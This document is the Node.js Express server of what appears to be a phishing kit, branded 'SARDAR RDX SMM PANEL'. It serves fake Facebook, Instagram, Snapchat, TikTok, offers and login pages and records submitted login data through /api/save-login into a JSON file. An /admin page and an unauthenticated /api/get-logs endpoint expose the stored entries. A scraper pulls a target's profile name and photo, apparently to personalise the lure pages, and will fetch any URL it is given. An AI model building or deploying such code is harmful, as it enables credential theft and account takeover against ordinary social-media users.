const express = require('express');
const path = require('path');
const https = require('https');
const http = require('http');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 5000;

app.use(express.json());
app.use(express.static(path.join(__dirname)));

// ── File-based DB ──────────────────────────────────────────────
const DB_FILE = path.join(__dirname, 'data.json');

function readDB() {
    try {
        if (!fs.existsSync(DB_FILE)) return { logins: [], requests: [] };
        return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
    } catch { return { logins: [], requests: [] }; }
}

function writeDB(data) {
    try { fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2)); } catch {}
}

// ── Save Login ─────────────────────────────────────────────────
app.post('/api/save-login', (req, res) => {
    try {
        const db = readDB();
        const entry = { ...req.body, time: new Date().toLocaleString() };
        db.logins.push(entry);
        writeDB(db);
        res.json({ success: true });
    } catch { res.json({ success: false }); }
});

// ── Save Request ───────────────────────────────────────────────
app.post('/api/save-request', (req, res) => {
    try {
        const db = readDB();
        const entry = { ...req.body, time: new Date().toLocaleString() };
        db.requests.push(entry);
        writeDB(db);
        res.json({ success: true });
    } catch { res.json({ success: false }); }
});

// ── Get Logs ───────────────────────────────────────────────────
app.get('/api/get-logs', (req, res) => {
    try {
        const db = readDB();
        res.json(db);
    } catch { res.json({ logins: [], requests: [] }); }
});

// ── Clear Logs ─────────────────────────────────────────────────
app.post('/api/clear-logs', (req, res) => {
    try {
        writeDB({ logins: [], requests: [] });
        res.json({ success: true });
    } catch { res.json({ success: false }); }
});

// ── Profile Name Fetcher ──────────────────────────────────────
// ── Universal Profile API Service ──────────────────────────────
app.get('/api/profile-name', async (req, res) => {
    const targetUrl = req.query.url;
    if (!targetUrl) return res.json({ success: false, error: 'No URL provided' });

    try {
        const parsedUrl = new URL(targetUrl);
        const domain = parsedUrl.hostname.replace('www.', '');
        
        let result = { success: false, name: null };

        if (domain.includes('facebook.com') || domain.includes('fb.com')) {
            result = await fetchFacebookProfile(parsedUrl);
        } else if (domain.includes('instagram.com')) {
            result = await fetchInstagramProfile(parsedUrl);
        } else if (domain.includes('tiktok.com')) {
            result = await fetchGenericProfile(targetUrl, 'TikTok');
        } else if (domain.includes('snapchat.com')) {
            result = await fetchGenericProfile(targetUrl, 'Snapchat');
        } else if (domain.includes('twitter.com') || domain.includes('x.com')) {
            result = await fetchGenericProfile(targetUrl, 'X');
        } else if (domain.includes('youtube.com')) {
            result = await fetchGenericProfile(targetUrl, 'YouTube');
        } else {
            result = await fetchGenericProfile(targetUrl, 'Social Media');
        }

        res.json(result);
    } catch (err) {
        res.json({ success: false, error: 'Internal API Error' });
    }
});

// --- PLATFORM SCRAPERS ---

async function fetchFacebookProfile(url) {
    const genericNames = ['facebook', 'home', 'log in', 'log into', 'welcome', 'sign up',
        'facebook - log in or sign up', 'log into facebook', 'create new account'];

    function cleanFbName(raw) {
        if (!raw) return null;
        let n = raw
            .replace(/\s*[|\-–—]\s*Facebook.*/i, '')
            .replace(/&amp;/g, '&').replace(/&#039;/g, "'").replace(/&quot;/g, '"')
            .trim();
        if (!n || n.length < 2) return null;
        if (genericNames.some(g => n.toLowerCase().includes(g))) return null;
        return n;
    }

    function extractFbName(html) {
        // JSON-LD structured data
        const jsonLdMatch = html.match(/<script[^>]+type=["']application\/ld\+json["'][^>]*>([\s\S]*?)<\/script>/gi);
        if (jsonLdMatch) {
            for (const block of jsonLdMatch) {
                try {
                    const json = JSON.parse(block.replace(/<\/?script[^>]*>/gi, ''));
                    if (json.name) { const n = cleanFbName(json.name); if (n) return n; }
                } catch {}
            }
        }
        // OG / meta
        const patterns = [
            /<meta[^>]+property=["']og:title["'][^>]+content=["']([^"']+)["']/i,
            /<meta[^>]+content=["']([^"']+)["'][^>]+property=["']og:title["']/i,
            /<h1[^>]*>\s*([^<]{2,80})\s*<\/h1>/i,
            /<h3[^>]*class=["'][^"']*name[^"']*["'][^>]*>\s*([^<]+)\s*<\/h3>/i,
            /<strong[^>]*>\s*([^<]{2,60})\s*<\/strong>/i,
            /<title[^>]*>([^<]+)<\/title>/i
        ];
        for (const p of patterns) {
            const m = html.match(p);
            if (m && m[1]) { const n = cleanFbName(m[1]); if (n) return n; }
        }
        // Description sentence patterns
        const descM = html.match(/<meta[^>]+(?:name|property)=["'](?:description|og:description)["'][^>]+content=["']([^"']{10,}?)["']/i)
                   || html.match(/<meta[^>]+content=["']([^"']{10,}?)["'][^>]+(?:name|property)=["'](?:description|og:description)["']/i);
        if (descM) {
            const desc = descM[1];
            const cm = desc.match(/connect with ([A-Za-z][^.,(]{1,50}) on Facebook/i)
                    || desc.match(/join facebook to connect with ([A-Za-z][^.,(]{1,50})\./i)
                    || desc.match(/^([A-Za-z][^|.(,]{1,50}) is on Facebook/i);
            if (cm) { const n = cleanFbName(cm[1]); if (n) return n; }
        }
        return null;
    }

    const HEADERS = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Upgrade-Insecure-Requests': '1'
    };

    const attempts = [
        `https://mbasic.facebook.com${url.pathname}${url.search}`,
        `https://m.facebook.com${url.pathname}${url.search}`,
        url.href
    ];

    let foundName = null;
    let foundImage = null;

    for (const attempt of attempts) {
        console.log(`[FB SCAN] Trying: ${attempt}`);
        const html = await requestHtmlWithHeaders(attempt, HEADERS);
        if (html) {
            if (!foundName) foundName = extractFbName(html);
            if (!foundImage) foundImage = extractOgImage(html);
            if (foundName) break;
        }
    }

    // Try Graph API for picture (works for public profiles/pages)
    if (!foundImage) {
        const identifier = url.pathname.includes('profile.php')
            ? new URLSearchParams(url.search).get('id')
            : url.pathname.replace(/\//g, '').split('?')[0];
        if (identifier) foundImage = await fetchFacebookPicture(identifier);
    }

    if (foundName) {
        console.log(`[FB SCAN] Found name: ${foundName}`);
        return { success: true, name: foundName, imageUrl: foundImage || null };
    }

    // Last resort: Microlink
    console.log(`[FB SCAN] All direct attempts failed, trying Microlink...`);
    const mlResult = await microlinkFetch(url.href);
    if (mlResult) {
        const name = cleanFbName(mlResult);
        if (name) return { success: true, name, imageUrl: foundImage || null };
    }

    return { success: false, error: 'Profile is Private/Protected', imageUrl: foundImage || null };
}

async function fetchFacebookPicture(username) {
    // Facebook Graph API — works for public profiles without auth
    return new Promise((resolve) => {
        const apiUrl = `https://graph.facebook.com/${encodeURIComponent(username)}/picture?type=large&redirect=false`;
        https.get(apiUrl, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const json = JSON.parse(data);
                    if (json.data && !json.data.is_silhouette && json.data.url) {
                        resolve(json.data.url);
                    } else { resolve(null); }
                } catch { resolve(null); }
            });
        }).on('error', () => resolve(null));
    });
}

function extractOgImage(html) {
    const patterns = [
        /<meta[^>]+property=["']og:image["'][^>]+content=["']([^"']+)["']/i,
        /<meta[^>]+content=["']([^"']+)["'][^>]+property=["']og:image["']/i,
        /<meta[^>]+name=["']twitter:image["'][^>]+content=["']([^"']+)["']/i,
        /<meta[^>]+content=["']([^"']+)["'][^>]+name=["']twitter:image["']/i
    ];
    for (const p of patterns) {
        const m = html.match(p);
        if (m && m[1] && m[1].startsWith('http') && !m[1].includes('default') && !m[1].includes('placeholder')) {
            return m[1];
        }
    }
    return null;
}

async function fetchInstagramProfile(url) {
    console.log(`[IG SCAN] Requesting: ${url.href}`);
    const html = await requestHtml(url.href);
    if (!html) return { success: false, error: 'Request Failed' };

    let name = extractFromHtml(html, [
        /<meta[^>]+property=["']og:title["'][^>]+content=["']([^"']+)["']/i,
        /<title[^>]*>([^<]+)<\/title>/i
    ]);
    if (name) name = name.split('(@')[0].split('•')[0].split('|')[0].trim();

    const imageUrl = extractOgImage(html);
    return name
        ? { success: true, name, imageUrl: imageUrl || null }
        : { success: false, error: 'IG Protected', imageUrl: imageUrl || null };
}

async function fetchGenericProfile(url, platform) {
    console.log(`[GENERIC SCAN] ${platform} | Requesting: ${url}`);
    const html = await requestHtml(url);
    if (!html) return { success: false, error: 'Request Failed' };

    let name = extractFromHtml(html, [
        /<meta[^>]+property=["']og:title["'][^>]+content=["']([^"']+)["']/i,
        /<meta[^>]+name=["']twitter:title["'][^>]+content=["']([^"']+)["']/i,
        /<title[^>]*>([^<]+)<\/title>/i
    ]);
    if (name) name = name.split(/[|(\/•·-]/)[0].replace(new RegExp(`\\s*on\\s*${platform}.*`, 'i'), '').trim();

    const imageUrl = extractOgImage(html);
    return name
        ? { success: true, name, imageUrl: imageUrl || null }
        : { success: false, error: 'Not Found', imageUrl: imageUrl || null };
}

async function requestHtml(targetUrl) {
    const defaultHeaders = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    };
    const result = await requestHtmlWithHeaders(targetUrl, defaultHeaders);
    if (result) return result;

    console.log(`[API FALLBACK] Using Microlink for: ${targetUrl}`);
    const title = await microlinkFetch(targetUrl);
    if (title) return `<html><head><title>${title}</title><meta property="og:title" content="${title}"></head></html>`;
    return null;
}

async function requestHtmlWithHeaders(targetUrl, headers) {
    return new Promise((resolve) => {
        try {
            const parsed = new URL(targetUrl);
            const protocol = parsed.protocol === 'https:' ? https : http;
            const options = { method: 'GET', headers, timeout: 8000 };
            const req = protocol.get(targetUrl, options, (res) => {
                // Follow single redirect
                if ((res.statusCode === 301 || res.statusCode === 302) && res.headers.location) {
                    const redirectUrl = res.headers.location.startsWith('http')
                        ? res.headers.location
                        : `${parsed.protocol}//${parsed.host}${res.headers.location}`;
                    requestHtmlWithHeaders(redirectUrl, headers).then(resolve);
                    return;
                }
                if (res.statusCode === 200) {
                    let data = '';
                    res.on('data', chunk => { if (data.length < 300000) data += chunk; });
                    res.on('end', () => resolve(data || null));
                } else {
                    resolve(null);
                }
            });
            req.on('error', () => resolve(null));
            req.on('timeout', () => { req.destroy(); resolve(null); });
        } catch { resolve(null); }
    });
}

async function microlinkFetch(targetUrl) {
    return new Promise((resolve) => {
        const apiUrl = `https://api.microlink.io?url=${encodeURIComponent(targetUrl)}&screenshot=false&meta=true`;
        https.get(apiUrl, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const json = JSON.parse(data);
                    if (json.status === 'success' && json.data) {
                        resolve(json.data.title || json.data.author || null);
                    } else { resolve(null); }
                } catch { resolve(null); }
            });
        }).on('error', () => resolve(null));
    });
}

function extractFromHtml(html, patterns) {
    for (const pattern of patterns) {
        const match = html.match(pattern);
        if (match && match[1]) {
            let val = match[1].replace(/&amp;/g, '&').replace(/&#039;/g, "'").replace(/&quot;/g, '"').trim();
            if (val.length > 1) return val;
        }
    }
    return null;
}

// Routes for clean URLs
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/facebook', (req, res) => {
    res.sendFile(path.join(__dirname, 'facebook.html'));
});

app.get('/instagram', (req, res) => {
    res.sendFile(path.join(__dirname, 'instagram.html'));
});

app.get('/snapchat', (req, res) => {
    res.sendFile(path.join(__dirname, 'snapchat.html'));
});

app.get('/tiktok', (req, res) => {
    res.sendFile(path.join(__dirname, 'tiktok.html'));
});

app.get('/offers', (req, res) => {
    res.sendFile(path.join(__dirname, 'offers.html'));
});

app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'login.html'));
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

// Start the server (local dev)
app.listen(PORT, () => {
    console.log(`===========================================`);
    console.log(`   SARDAR RDX SMM PANEL IS RUNNING`);
    console.log(`   URL: http://localhost:${PORT}`);
    console.log(`===========================================`);
});
